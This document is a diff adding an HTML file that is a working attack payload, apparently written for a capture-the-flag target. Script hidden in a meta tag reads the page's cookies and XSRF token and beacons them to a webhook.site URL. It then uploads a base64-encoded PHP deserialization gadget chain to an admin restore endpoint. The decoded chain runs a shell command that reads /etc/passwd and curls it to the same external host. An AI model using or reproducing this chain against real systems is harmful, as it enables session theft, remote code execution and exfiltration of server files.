@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html><head><title>XSS Upload - Simplified XSRF Logic</title>
+<!-- VERSION_XSS_UPLOAD_XSRF_SIMPLIFIED_V1 -->
+<meta name="description" content='<script>
+    (function() {
+        var webhook_id = "792a817c-a6b3-4529-a9ed-5780c728488a";
+        var attacker_url = "https://webhook.site/" + webhook_id;
+        var base64SavPayload = "Tzo1NToiSWxsdW1pbmF0ZVxSb3V0aW5nXFBlbmRpbmdTaW5nbGV0b25SZXNvdXJjZVJlZ2lzdHJhdGlvbiI6NDp7czoxMjoiACoAcmVnaXN0cmFyIjtPOjM1OiJJbGx1bWluYXRlXERhdGFiYXNlXERhdGFiYXNlTWFuYWdlciI6Mzp7czo2OiIAKgBhcHAiO2E6MTp7czo2OiJjb25maWciO2E6Mjp7czoxNjoiZGF0YWJhc2UuZGVmYXVsdCI7czo2OiJzeXN0ZW0iO3M6MjA6ImRhdGFiYXNlLmNvbm5lY3Rpb25zIjthOjE6e3M6Njoic3lzdGVtIjtzOjE2NToiYWNhdCAvZXRjL3Bhc3N3ZCA+IC90bXAvZmxhZzNfY29udGVudC50eHQ7IGN1cmwgLUYgZmxhZzM9QC90bXAvZmxhZzNfY29udGVudC50eHQgaHR0cHM6Ly93ZWJob29rLnNpdGUvNzkyYTgxN2MtYTZiMy00NTI5LWE5ZWQtNTc4MGM3Mjg0ODhhOyBybSAvdG1wL2ZsYWczX2NvbnRlbnQudHh0Ijt9fX1zOjEwOiIAKgBmYWN0b3J5IjtzOjg6ImFueXRoaW5nIjtzOjEzOiIAKgBleHRlbnNpb25zIjthOjE6e3M6Njoic3lzdGVtIjtzOjEyOiJhcnJheV9maWx0ZXIiO319czo3OiIAKgBuYW1lIjtzOjQ6Im5hbWUiO3M6MTM6IgAqAGNvbnRyb2xsZXIiO3M6MTA6ImNvbnRyb2xsZXIiO3M6MTA6IgAqAG9wdGlvbnMiO2E6MDp7fX0K"; // << NHỚ DÁN PAYLOAD THẬT
+
+        function sendPing(data_obj) {
+            var params = new URLSearchParams();
+            params.append("source_tag", "name:description_XSRF_SIMPLIFIED_V1"); 
+            for (var key in data_obj) { /* ... sendPing như cũ, đảm bảo cắt bớt giá trị dài ... */ 
+                if (data_obj.hasOwnProperty(key)) {
+                    let value = data_obj[key];
+                    if (typeof value === "object" && value !== null) {
+                        if (value instanceof Error) value = { name: value.name, message: value.message, stack: value.stack ? value.stack.substring(0,200) : "no_stack" };
+                        try { params.append(key, JSON.stringify(value).substring(0, 1000)); } 
+                        catch (e) { params.append(key, "[Unserializable]"); }
+                    } else { params.append(key, String(value).substring(0, 1000)); }
+                }
+            }
+            new Image().src = attacker_url + "?" + params.toString();
+        }
+
+        function b64toBlob(b64Data, contentType="application/octet-stream") { /* ... như cũ ... */ 
+            try {
+                const byteCharacters = atob(b64Data);
+                const byteArrays = [];
+                for (let offset = 0; offset < byteCharacters.length; offset += 512) {
+                    const slice = byteCharacters.slice(offset, offset + 512);
+                    const byteNumbers = new Array(slice.length);
+                    for (let i = 0; i < slice.length; i++) { byteNumbers[i] = slice.charCodeAt(i); }
+                    byteArrays.push(new Uint8Array(byteNumbers));
+                }
+                return new Blob(byteArrays, {type: contentType});
+            } catch (e) { sendPing({stage: "b64toBlob_error_simplified", error: e.message}); return null; }
+        }
+        
+        try {
+            var placeholderString = "PASTE_YOUR_ACTUAL_BASE64_PAYLOAD_HERE";
+            sendPing({ stage: "script_start_simplified", loc: window.location.href, payload_is_placeholder: (base64SavPayload === placeholderString) });
+
+            if (!base64SavPayload || base64SavPayload === placeholderString || base64SavPayload.length < 100) {
+                sendPing({stage: "payload_string_invalid_simplified", current_payload_start: base64SavPayload.substring(0,50)});
+                return; 
+            }
+            sendPing({stage: "payload_string_valid_simplified", payload_len: base64SavPayload.length});
+
+            var rawXsrfTokenFromCookie = null;
+            var allCookies = document.cookie; // Lấy tất cả cookie để debug
+            var cookiesArray = allCookies.split(";");
+            for (var i = 0; i < cookiesArray.length; i++) {
+                var cookie = cookiesArray[i].trim();
+                if (cookie.startsWith("XSRF-TOKEN=")) {
+                    // THỬ KHÔNG DÙNG decodeURIComponent
+                    rawXsrfTokenFromCookie = cookie.substring("XSRF-TOKEN=".length);
+                    break;
+                }
+            }
+            
+            sendPing({ 
+                stage: "xsrf_token_extraction_simplified", 
+                all_cookies_preview: allCookies.substring(0,300),
+                extracted_raw_token_preview: rawXsrfTokenFromCookie ? rawXsrfTokenFromCookie.substring(0,50) + "..." : "NOT_FOUND"
+            });
+
+            if (!rawXsrfTokenFromCookie) {
+                sendPing({ stage: "xsrf_token_cookie_still_missing_simplified" });
+                // Không nên return, cứ thử gửi không có header CSRF để xem server phản hồi gì
+            }
+
+            var fileBlob = b64toBlob(base64SavPayload); 
+            if (!fileBlob) { return; } 
+
+            var uploadFile = new File([fileBlob], "backup.sav", {type: "application/octet-stream"});
+            var formData = new FormData();
+            formData.append("config_file", uploadFile, "backup.sav"); 
+
+            var fetchHeaders = { 
+                "Accept": "text/html,application/json,text/plain,*/*", 
+                "X-Requested-With": "XMLHttpRequest"
+            };
+
+            if (rawXsrfTokenFromCookie) {
+                // GỬI CẢ HAI HEADER ĐỂ TEST
+                fetchHeaders["X-CSRF-TOKEN"] = rawXsrfTokenFromCookie; 
+                fetchHeaders["X-XSRF-TOKEN"] = rawXsrfTokenFromCookie; 
+                sendPing({ stage: "formdata_created_SENDING_BOTH_CSRF_HEADERS", token_sent_preview: rawXsrfTokenFromCookie.substring(0,50) });
+            } else {
+                sendPing({ stage: "formdata_created_NO_CSRF_HEADERS_SENT" });
+            }
+
+            fetch("/admin/configs/restore", { 
+                method: "POST",
+                headers: fetchHeaders,
+                body: formData
+            })
+            .then(response => {
+                var status = response.status;
+                sendPing({ stage: "upload_response_simplified_attempt", status: status, ok: response.ok, url_after_resp: response.url });
+                if (!response.ok && !(status >= 300 && status < 400) ) { 
+                     return response.text().then(text => {
+                        sendPing({ stage: "upload_error_simplified_attempt", status: status, body: text.substring(0,300) });
+                     });
+                } else if (response.ok || (status >=300 && status < 400)) {
+                    sendPing({ stage: "upload_simplified_attempt_SEEMS_OK_OR_REDIRECT", status: status});
+                }
+            })
+            .catch(error => {
+                sendPing({ stage: "upload_fetch_catch_error_simplified_attempt", error: error.message });
+            });
+
+        } catch (e_outer) {
+            sendPing({ stage: "outer_script_error_simplified", error: e_outer.message });
+        }
+    })();
+</script>'></head><body><h1>XSS Upload - Simplified XSRF Logic</h1></body></html>
